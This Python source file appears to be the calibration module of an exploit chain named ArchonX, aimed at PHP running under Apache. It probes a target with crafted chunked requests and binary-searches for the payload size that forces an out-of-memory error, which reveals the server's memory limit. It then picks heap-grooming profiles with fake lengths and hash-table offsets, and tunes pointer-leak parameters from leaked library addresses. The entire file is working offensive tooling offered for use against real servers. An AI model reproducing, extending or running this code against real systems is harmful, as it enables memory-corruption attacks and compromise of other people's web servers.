"""Auto-calibration for the ArchonX exploit chain.

Probes the target to determine, without prior knowledge:
  - memory limit (binary search for the OOM trigger --big value)
  - architecture (from leaked pointer distribution)
  - optimal leak parameters (MAIN_BUCKET_COUNT, delta range)
  - payload sizing profile per memory limit
"""
from __future__ import annotations

import time

from .branding import log
from .transport import (
    TransportConfig, send_chunked, send_get, get_status_code,
)
from .payloads import build_a1_body, QUERY_STRING_128M
from .leak import LeakResult


# Payload sizing profiles indexed by memory_limit.
# Calibrated against the official Docker php:8.x-apache images.
SIZING_PROFILES = {
    "8M": {
        "a1_big": 0, "a1_parts": 200, "a1_fillers128": 4, "a1_burners": 5,
        "a2_parts": 200, "a2_fillers": 30,
        "fake_len": 0x8000, "ht_offset": 0x1E398,
    },
    "128M": {
        "a1_big": 78, "a1_parts": 860, "a1_fillers128": 14, "a1_burners": 20,
        "a2_parts": 880, "a2_fillers": 115,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
    "256M": {
        "a1_big": 160, "a1_parts": 1700, "a1_fillers128": 28, "a1_burners": 40,
        "a2_parts": 1760, "a2_fillers": 230,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
    "512M": {
        "a1_big": 320, "a1_parts": 3400, "a1_fillers128": 56, "a1_burners": 80,
        "a2_parts": 3520, "a2_fillers": 460,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
}


def binary_search_oom(cfg: TransportConfig, path: str = "/index.php",
                      min_big: int = 10, max_big: int = 400) -> int | None:
    """Find the smallest --big value that triggers an HTTP 500 OOM response.

    Sends A1-shaped payloads with increasing --big. When the status code
    transitions from 200 to 500, we have found the OOM threshold for the
    target's memory_limit. Returns the triggering value, or None if the
    target never OOMs within the probe range.
    """
    resp = send_get(cfg, path)
    if get_status_code(resp) == 0:
        log.warn("calibration aborted: target unreachable")
        return None

    log.field("calibration range", f"big={min_big}..{max_big}")
    log.info("starting binary search for OOM threshold")

    lo, hi = min_big, max_big
    last_oom: int | None = None

    while lo <= hi:
        mid = (lo + hi) // 2
        body = build_a1_body(big=mid)
        resp = send_chunked(cfg, path + QUERY_STRING_128M, body)
        code = get_status_code(resp)

        if code == 500:
            last_oom = mid
            hi = mid - 1
            log.info(f"probe big={mid} → HTTP 500 (oom reached)")
        elif code == 200:
            lo = mid + 1
            log.info(f"probe big={mid} → HTTP 200 (below threshold)")
        elif code == 0:
            log.warn(f"probe big={mid} → no response, aborting calibration")
            return last_oom
        else:
            lo = mid + 1
            log.info(f"probe big={mid} → HTTP {code}")

        time.sleep(0.3)

    if last_oom is not None:
        log.field("oom threshold", f"big={last_oom}")
    else:
        log.warn("no OOM reached within probe range")
    return last_oom


def detect_memory_limit(oom_big: int | None) -> str:
    """Estimate memory_limit from the OOM trigger --big value.

    Roughly linear: each --big contributes ~8 KB of value data plus fixed
    overhead from parts/fillers/burners.
    """
    if oom_big is None:
        return "unknown"
    if oom_big <= 5:
        return "8M"
    if oom_big <= 90:
        return "128M"
    if oom_big <= 180:
        return "256M"
    if oom_big <= 360:
        return "512M"
    return f">{512 * (oom_big // 360)}M"


def get_sizing_profile(memory_limit: str) -> dict:
    """Return the calibrated sizing profile for a memory limit."""
    return SIZING_PROFILES.get(memory_limit, SIZING_PROFILES["128M"])


def calibrate_leak_params(result: LeakResult) -> dict:
    """Analyse a leak result to tune MAIN_BUCKET_COUNT and delta range."""
    if not result.buckets:
        log.debug("calibrate_leak_params: no buckets, using defaults")
        return {
            "main_bucket_count": 87,
            "delta_min": 0x100000,
            "delta_max": 0xC000000,
        }

    lib_bucket = result.zval_ptr_dtor_addr & ~0x1FFFFF
    sorted_buckets = sorted(result.buckets.items(), key=lambda x: -x[1])
    id_bucket = sorted_buckets[0][0] if sorted_buckets else 0

    filtered = [(b, c) for b, c in sorted_buckets
                if b not in (lib_bucket, id_bucket)]

    if not filtered:
        return {
            "main_bucket_count": 87,
            "delta_min": 0x100000,
            "delta_max": 0xC000000,
        }

    main_count = filtered[0][1]
    main_base = filtered[0][0]

    if main_base:
        delta = abs(result.libphp_base - main_base)
        margin = max(delta // 4, 0x200000)
        delta_min = max(0x100000, delta - margin)
        delta_max = delta + margin
    else:
        delta_min, delta_max = 0x100000, 0xC000000

    log.debug(
        f"calibrated: main_count={main_count} "
        f"delta={delta_min:#x}..{delta_max:#x}"
    )

    return {
        "main_bucket_count": main_count,
        "delta_min": delta_min,
        "delta_max": delta_max,
    }
